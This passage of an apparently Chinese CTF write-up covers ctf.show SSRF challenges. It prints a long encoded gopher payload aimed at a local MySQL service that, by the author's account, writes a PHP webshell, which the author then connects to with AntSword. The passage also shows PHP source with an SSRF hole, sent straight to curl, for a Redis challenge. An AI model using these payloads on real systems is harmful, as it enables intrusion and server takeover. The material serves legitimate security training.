class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure>
+
+<p>经过BP抓包确定路径为check.php，参数为returl，POST传参</p>
+<p>发送</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">returl</span>=gopher://<span class="hljs-number">127.0.0.1:3306</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">61</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">38</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">61</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure>
+
+<p>然后访问1.php确认写入成功，蚁剑连接<a target="_blank" rel="noopener" href="http://03f79a31-b12e-4aaf-ba66-ec32a9754f49.challenge.ctf.show/1.php">http://03f79a31-b12e-4aaf-ba66-ec32a9754f49.challenge.ctf.show/1.php</a></p>
+<hr>
+<h2 id="web-360（打redis）"><a href="#web-360（打redis）" class="headerlink" title="web-360（打redis）"></a>web-360（打redis）</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>用工具生成payload：</p>
